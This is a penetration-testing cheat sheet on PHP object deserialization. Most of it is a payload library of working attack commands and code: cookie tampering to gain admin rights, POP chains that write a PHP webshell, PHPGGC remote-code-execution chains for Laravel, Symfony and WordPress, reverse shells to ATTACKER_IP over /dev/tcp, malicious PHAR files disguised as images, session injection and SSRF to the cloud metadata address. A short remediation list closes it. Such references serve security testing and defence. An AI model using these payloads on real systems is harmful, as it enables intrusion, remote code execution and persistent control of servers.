---
title: "PHP Object Deserialization"
date: 2026-02-24
draft: false
---

# PHP Object Deserialization

> **Severity**: Critical | **CWE**: CWE-502
> **OWASP**: A08:2021 – Software and Data Integrity Failures

---

## What Is PHP Deserialization?

PHP's `unserialize()` converts a serialized string back into a PHP object. If attacker-controlled data reaches `unserialize()`, the attacker can instantiate arbitrary classes. PHP **automatically calls magic methods** on deserialized objects:

```
__wakeup()    → called on unserialize
__destruct()  → called when object is garbage collected
__toString()  → called when object used as string
__call()      → called when invoking inaccessible method
__get()       → called when reading inaccessible property
__set()       → called when writing inaccessible property
__invoke()    → called when object used as function
```

A **POP chain** (Property-Oriented Programming) links multiple classes whose magic methods call each other, ultimately reaching a dangerous sink (file write, shell exec, SQL query, etc.).

```
unserialize(attacker_data)
  → __wakeup() / __destruct()  of class A
      → __toString() of class B
          → __call() / __get() of class C
              → system() / file_put_contents() / eval()
```

---

## Discovery Checklist

- [ ] Find `unserialize()` calls — source code review or grep
- [ ] Find serialized strings in: cookies, hidden form fields, GET/POST params, HTTP headers
- [ ] Identify serialized strings: `O:` (object), `a:` (array), `s:` (string), `b:` (bool), `i:` (int), `N;` (null)
- [ ] Base64-encoded cookies starting with `Tzo` (base64 of `O:`)
- [ ] PHAR deserialization triggers (file operations on attacker-controlled paths)
- [ ] Check installed libraries for PHPGGC gadget availability
- [ ] Test `__wakeup()` bypass with mangled object count
- [ ] Test `__destruct()` via garbage collection after `unserialize()`
- [ ] Look for `unserialize()` in: session handlers, cache layers, API endpoints, custom auth cookies

---

## PHP Serialization Format

```php
// PHP serialization syntax:
// b:0;             boolean false
// b:1;             boolean true
// i:42;            integer 42
// d:3.14;          float 3.14
// s:5:"hello";     string of length 5
// N;               null
// a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}    array of 2 elements
// O:8:"stdClass":1:{s:4:"name";s:5:"Alice";}
//   ^ class name len ^ class ^ prop count ^ property

// Object with private/protected properties:
// Protected: s:4:"\0*\0prop";     (null + * + null + propname)
// Private:   s:13:"\0ClassName\0prop";  (null + classname + null + propname)
```

---

## Payload Library

### Payload 1 — Manual Serialization: Modify Existing Object

```php
// Original legitimate serialized cookie (base64 decoded):
O:4:"User":2:{s:8:"username";s:5:"guest";s:5:"admin";b:0;}

// Modified: set admin=true
O:4:"User":2:{s:8:"username";s:5:"admin";s:5:"admin";b:1;}

// Modified: change username to admin string
O:4:"User":2:{s:8:"username";s:5:"admin";s:5:"admin";b:1;}

// Base64 re-encode for cookie:
echo -n 'O:4:"User":2:{s:8:"username";s:5:"admin";s:5:"admin";b:1;}' | base64
```

### Payload 2 — `__wakeup()` Bypass

PHP < 5.6.25 / PHP < 7.0.10: `__wakeup()` not called if declared property count > actual count.

```
// Normal:
O:8:"UserPref":1:{s:4:"data";s:4:"test";}

// Bypass __wakeup() — declare 2 properties but only define 1:
O:8:"UserPref":2:{s:4:"data";s:4:"test";}
              ^--- lie about count
```

### Payload 3 — Simple POP Chain Example

```php
// If target codebase has something like:
class Logger {
    public $logfile = '/var/log/app.log';
    public $data;

    public function __destruct() {
        file_put_contents($this->logfile, $this->data);
    }
}

// Craft payload to write PHP webshell:
$payload = new Logger();
$payload->logfile = '/var/www/html/shell.php';
$payload->data = '<?php system($_GET["cmd"]); ?>';
echo serialize($payload);
// O:6:"Logger":2:{s:7:"logfile";s:24:"/var/www/html/shell.php";s:4:"data";s:29:"<?php system($_GET["cmd"]); ?>";}
```

### Payload 4 — PHPGGC Generated Chains

PHPGGC is the PHP version of ysoserial — pre-built POP chains for common frameworks.

```bash
# Install PHPGGC:
git clone https://github.com/ambionics/phpggc
cd phpggc

# List all available gadget chains:
./phpggc -l

# List chains for specific framework:
./phpggc -l Laravel
./phpggc -l Symfony
./phpggc -l WordPress
./phpggc -l Guzzle
./phpggc -l Monolog
./phpggc -l Slim
./phpggc -l Yii
./phpggc -l CodeIgniter4
./phpggc -l Laminas
./phpggc -l Drupal

# Generate RCE payload (Laravel, file write via queue):
./phpggc Laravel/RCE1 system 'id > /tmp/pwned'
./phpggc Laravel/RCE2 system 'id'
./phpggc Laravel/RCE3 exec 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# Generate Symfony RCE:
./phpggc Symfony/RCE3 exec 'id'
./phpggc Symfony/RCE4 system 'whoami'

# File write chains:
./phpggc Monolog/RCE1 system 'id'
./phpggc Guzzle/FW1 write /var/www/html/shell.php '<?php system($_GET[0]);?>'

# Base64-encode output (for cookies/headers):
./phpggc Laravel/RCE1 system 'id' -b
./phpggc Laravel/RCE1 system 'id' --base64

# URL-encode output:
./phpggc Laravel/RCE1 system 'id' -u

# Wrap in JSON (for JSON APIs):
./phpggc Laravel/RCE1 system 'id' -j

# Generate and test with curl:
PAYLOAD=$(./phpggc Laravel/RCE1 system 'id' -b)
curl -s -b "laravel_session=$PAYLOAD" https://target.com/dashboard

# With PHAR wrapper (use as path instead of direct unserialize):
./phpggc Laravel/RCE1 system 'id' --phar phar -o /tmp/exploit.phar
```

### Payload 5 — WordPress-Specific Chains

```bash
# WordPress gadget chains via PHPGGC:
./phpggc -l WordPress

# WordPress/RCE1 — Yoast SEO plugin gadget:
./phpggc WordPress/RCE1 exec 'id'

# WordPress/RCE2 — Dompdf:
./phpggc WordPress/RCE2 system 'id'

# Common WordPress deserialization sinks:
# - Plugins using unserialize() in shortcodes
# - Option values stored/retrieved via get_option()
# - Transients: get_transient(), set_transient()
# - User meta: get_user_meta()
# - Theme customizer preview
# - AJAX handlers with unserialize() on POST data
```

### Payload 6 — PHAR Deserialization (File Operation Trigger)

PHAR archives have serialized metadata that is **deserialized when any file operation touches the archive** — even `file_exists()`, `is_readable()`, `stat()`, etc.

```bash
# Create malicious PHAR:
php -r "
\$phar = new Phar('exploit.phar');
\$phar->startBuffering();
\$phar->addFromString('test.txt', 'test');
\$phar->setStub('<?php __HALT_COMPILER(); ?>');

// Embed malicious serialized object:
class Logger {
    public \$logfile = '/var/www/html/shell.php';
    public \$data = '<?php system(\$_GET[\"cmd\"]); ?>';
    public function __destruct() {
        file_put_contents(\$this->logfile, \$this->data);
    }
}
\$obj = new Logger();
\$phar->setMetadata(\$obj);
\$phar->stopBuffering();
"

# Trigger via PHAR wrapper — any file function works:
# If target does: file_exists(\$_GET['path'])
# Send: ?path=phar:///uploads/exploit.phar/test.txt

# Common trigger points:
# - Image processing (imagecreatefrompng, getimagesize)
# - File inclusion guards (file_exists, is_file)
# - XML parsing (simplexml_load_file)
# - ZIP manipulation (ZipArchive::open)
# - Any function that accepts a filename

# Rename PHAR to bypass upload filters:
mv exploit.phar exploit.jpg    # disguise as image
mv exploit.phar exploit.gif
mv exploit.phar exploit.zip
```

### Payload 7 — `__toString()` Chain via Type Juggling

```php
// Classes that use objects as strings:
class QueryBuilder {
    public $table;
    public function __toString() {
        return "SELECT * FROM " . $this->table;  // $this->table used as string
    }
}

class Shell {
    public $cmd = "id";
    public function __toString() {
        return system($this->cmd);  // RCE via toString
    }
}

// Craft payload:
$s = new Shell();
$s->cmd = "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1";
echo serialize($s);
```

### Payload 8 — Session-Based Deserialization

```bash
# PHP session files are serialized — if you can write to session file:
# Session format depends on session.serialize_handler:

# php_serialize (newer):
# a:1:{s:4:"data";O:4:"User":1:{s:4:"name";s:5:"admin";}}

# php (default):
# data|O:4:"User":1:{s:4:"name";s:5:"admin";}

# php_binary (legacy):
# [binary length byte]dataO:4:"User":1:{...}

# Inject via session handler mismatch:
# If app writes session as php_serialize but reads as php:
# Set cookie: PHPSESSID=<crafted>
# Content: |O:8:"Exploitable":0:{}
# The pipe "|" becomes a key separator in php handler

# Session upload progress injection (race condition):
curl -X POST https://target.com/upload \
  -F "PHP_SESSION_UPLOAD_PROGRESS=|O:8:\"MyClass\":0:{}" \
  -F "file=@test.txt" \
  --cookie "PHPSESSID=known_session_id"
```

### Payload 9 — Blind Detection Payloads

```php
// Time-delay detection (sleep in destruct):
// Craft object with sleep(5) to confirm deserialization:
class TimeDelay {
    public $seconds = 5;
    public function __destruct() {
        sleep($this->seconds);
    }
}

// DNS OOB detection — use interactsh/Burp Collaborator:
// Use PHPGGC chain that triggers DNS:
./phpggc -l | grep -i dns
./phpggc Monolog/RCE1 system 'nslookup COLLABORATOR_ID.oast.pro'
./phpggc Guzzle/SSRF1 https://COLLABORATOR_ID.oast.pro/test

// If app uses Guzzle HTTP client internally:
./phpggc Guzzle/SSRF1 http://169.254.169.254/
```

---

## Tools

```bash
# PHPGGC — PHP gadget chain generator:
git clone https://github.com/ambionics/phpggc
./phpggc -l                                        # list all chains
./phpggc <Gadget/Chain> <function> <argument>      # generate payload
./phpggc Laravel/RCE1 system 'id' -b               # base64 output

# php-unserialize-cli — decode/inspect serialized data:
php -r "print_r(unserialize(base64_decode('PAYLOAD')));"

# Burp Suite extensions:
# - Java Deserialization Scanner (also covers PHP patterns)
# - Freddy Deserialization Bug Finder

# phpggc with encoder chain:
./phpggc Laravel/RCE1 system 'id' -e base64       # base64 encode
./phpggc Laravel/RCE1 system 'id' -e url           # URL encode
./phpggc Laravel/RCE1 system 'id' -e json          # JSON encode

# Grep target source for dangerous sinks:
grep -rn "unserialize(" /var/www/html/ --include="*.php"
grep -rn "unserialize(\$_" /var/www/html/ --include="*.php"    # user input
grep -rn "unserialize(base64_decode" /var/www/html/ --include="*.php"

# Identify serialized data in traffic (Burp):
# Search for: O:\d+:" in responses/cookies
# Search for base64 patterns starting with: Tzo (= O:)

# PHAR test:
php -r "echo serialize(new stdClass());"

# Create unsigned PHAR (requires phar.readonly=0):
php -d phar.readonly=0 create_exploit.php
```

---

## Remediation Reference

- **Never pass user input to `unserialize()`** — use JSON (`json_decode`) instead
- **If unavoidable**: use HMAC-signed serialized data (verify signature before deserializing)
- **Disable PHAR wrapper**: `stream_wrapper_unregister('phar')` at boot
- **Update PHP**: `__wakeup()` bypass fixed in PHP 7.4+
- **Allowlist classes**: use `unserialize($data, ['allowed_classes' => ['SafeClass']])`  (PHP 7+)
- **Disable dangerous functions**: `disable_functions = system,exec,shell_exec,passthru,proc_open,popen`
- **Apply defense-in-depth**: separate web user from filesystem write permissions

*Part of the Web Application Penetration Testing Methodology series.*
